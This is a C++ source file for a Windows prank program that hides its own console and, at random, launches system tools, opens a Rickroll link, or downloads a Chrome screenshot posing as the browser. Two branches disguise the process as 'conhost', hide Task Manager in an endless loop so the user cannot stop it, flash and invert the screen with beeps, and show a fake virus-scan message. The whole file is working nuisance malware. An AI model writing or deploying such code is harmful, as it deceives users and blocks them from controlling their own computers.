#include <iostream>
#include <windows.h>
#include <fstream>
#include <random>
#include <thread>
#include <direct.h>
#include <functional>
bool done = false;
HWND TASKMGR = NULL;
void finish1()
{
    Sleep(10000);
    done = true;
}
bool is_file_exist(const char* fileName)
{
    std::ifstream infile(fileName);
    return infile.good();
}
void hideTaskMgr()
{
    while (true)
    {
        TASKMGR = FindWindow(NULL, L"Task Manager");
        ShowWindow(TASKMGR, SW_HIDE);
    }
}
void main(int argc, const char* argv)
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::random_device rdv;
    std::mt19937 rng(rdv());
    std::uniform_int_distribution<std::mt19937::result_type> distrib(1, 26); 
    int rd = distrib(rng);
    
    if (rd == 1)
    {
        system("start notepad.exe");
    }else if (rd == 2)
    {
        system("start calc.exe");
    }
    else if (rd == 3)
    {
        system("start write.exe");
    }
    else if (rd == 4)
    {
        system("start azman.msc");
    }
    else if (rd == 5)
    {
        system("start cmd");
    }
    else if (rd == 6)
    {
        system("start powershell");
    }
    else if (rd == 7)
    {
        system("start C:\\Windows\\System32\\bootim.exe");
    }
    else if (rd == 8)
    {
        system("start msedge.exe");
    }
    else if (rd == 9)
    {
        system("start CloudNotifications.exe");
    }
    else if (rd == 10)
    {
        system("start cmstp.exe");
    }
    else if (rd == 11)
    {
        system("start colorcpl.exe");
    }
    else if (rd == 12)
    {
        system("start comexp.msc");
    }
    else if (rd == 13)
    {
        system("start control.exe");
    }
    else if (rd == 14)
    {
        system("start cttune.exe");
    }
    else if (rd == 15)
    {
        system("start dccw.exe");
    }
    else if (rd == 16)
    {
        system("start devmgmt.msc");
    }
    else if (rd == 17)
    {
        system("start dfrgui.exe");
    }
    else if (rd == 18)
    {
        system("start DpiScaling.exe");
    }
    else if (rd == 19)
    {
        system("start iexpress.exe");
    }
    else if (rd == 20)
    {
        system("start printui.exe");
    }
    else if (rd == 21)
    {
        SetConsoleTitle(L"conhost");
        std::thread task_Mgr(hideTaskMgr);
        task_Mgr.detach();
        Beep(1000, 1);
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        HDC hdc = GetDC(HWND_DESKTOP);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        std::thread fast(finish1);
        fast.detach();
        //done = true;
        HDC desk = GetDC(0);
        int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        while (!done)
        {
            Beep(1000, 1);

            brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(desk, brush);
            PatBlt(desk, rand() % 1000, rand() % 1000, xs, ys, PATINVERT);
            LineTo(desk, rand() % 1900, rand() % 1200);

            brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(desk, brush);
            PatBlt(desk, 1, 1, xs, ys, PATINVERT);
        }
        done = false;

        int x = -10, y = 0;
        MessageBox(0, L"Scanning Computer for viruses...", L"Beep Boop", MB_HELP);
        std::thread fast2(finish1);
        fast2.detach();
        while (!done)
        {

            brush = CreateSolidBrush(RGB(100, 100, 100/*rand() % 100, rand() % 100, rand() % 255 */));
            SelectObject(hdc, brush);
            //Beep(1000 + rand() % 3000, 1);
            y += 2;
            PatBlt(hdc, x, y, sw, 20, PATINVERT);
            if (y > sh)
            {
                y = 0;
            }
        }
        MessageBox(0, L"No viruses found", L"Beep Boop", MB_HELP);
    }
    else if (rd == 22)
    {
    SetConsoleTitle(L"conhost");
    std::thread task_Mgr(hideTaskMgr);
    task_Mgr.detach();
    Beep(1000, 1);
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HDC hdc = GetDC(HWND_DESKTOP);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    std::thread fast(finish1);
    fast.detach();
    //done = true;
    HDC desk = GetDC(0);
    int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    while (!done)
    {
        Beep(1000, 1);

        brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(desk, brush);
        PatBlt(desk, rand() % 1000, rand() % 1000, xs, ys, PATINVERT);
        LineTo(desk, rand() % 1900, rand() % 1200);

        brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(desk, brush);
        PatBlt(desk, 1, 1, xs, ys, PATINVERT);
    }
    done = false;

    int x = -10, y = 0;
    MessageBox(0, L"Scanning Computer for viruses...", L"Beep Boop", MB_HELP);
    std::thread fast2(finish1);
    fast2.detach();
    while (!done)
    {

        brush = CreateSolidBrush(RGB(100, 100, 100/*rand() % 100, rand() % 100, rand() % 255 */));
        SelectObject(hdc, brush);
        //Beep(1000 + rand() % 3000, 1);
        y += 2;
        PatBlt(hdc, x, y, sw, 20, PATINVERT);
        if (y > sh)
        {
            y = 0;
        }
    }
    MessageBox(0, L"No viruses found", L"Beep Boop", MB_HELP);
    }
    else if (rd == 23)
    {
    _mkdir("C:\\prschr");
    
    system("echo Close this windows to start chrome > C:\\prschr\\pr.txt");
    system("notepad C:\\prschr\\pr.txt");
    system("curl https://upload.wikimedia.org/wikipedia/commons/8/87/Google_Chrome_75_screenshot.png > C:\\prschr\\chrm.png");
    system("C:\\prschr\\chrm.png");
    }
    else if (rd == 24)
    {
    _mkdir("C:\\prschr");

    system("echo Close this windows to start chrome > C:\\prschr\\pr.txt");
    system("notepad C:\\prschr\\pr.txt");
    system("curl https://upload.wikimedia.org/wikipedia/commons/8/87/Google_Chrome_75_screenshot.png > C:\\prschr\\chrm.png");
    system("C:\\prschr\\chrm.png");
    }
    else if (rd == 25)
    {
    system("start msedge.exe https://youtu.be/dQw4w9WgXcQ");
    }
    else if (rd == 26)
    {
    system("start msedge.exe https://youtu.be/dQw4w9WgXcQ");
    }
    

}
